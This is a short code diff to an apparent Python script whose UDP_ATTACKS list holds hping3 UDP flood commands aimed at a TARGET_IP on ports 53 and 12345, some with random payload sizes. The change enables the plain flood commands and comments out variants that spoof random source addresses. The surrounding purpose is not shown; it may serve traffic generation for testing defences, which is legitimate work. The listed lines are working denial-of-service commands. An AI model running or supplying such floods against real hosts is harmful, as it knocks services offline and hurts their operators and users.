@@ -12,11 +12,11 @@ def generate_random_payload_size():
 
 
 UDP_ATTACKS = [
-    # f"hping3 --udp --flood -p 53 {TARGET_IP}",
-    # f"hping3 --udp --flood -p 12345 {TARGET_IP} -d {generate_random_payload_size()}",    
+    f"hping3 --udp --flood -p 53 {TARGET_IP}",
+    f"hping3 --udp --flood -p 12345 {TARGET_IP} -d {generate_random_payload_size()}",    
     
-    f"hping3 --udp --flood -p 53 --rand-source {TARGET_IP}",
-    f"hping3 --udp --flood -p 12345 --rand-source {TARGET_IP} -d {generate_random_payload_size()}",
+    # f"hping3 --udp --flood -p 53 --rand-source {TARGET_IP}",
+    # f"hping3 --udp --flood -p 12345 --rand-source {TARGET_IP} -d {generate_random_payload_size()}",
 ]
 
 i = 0 
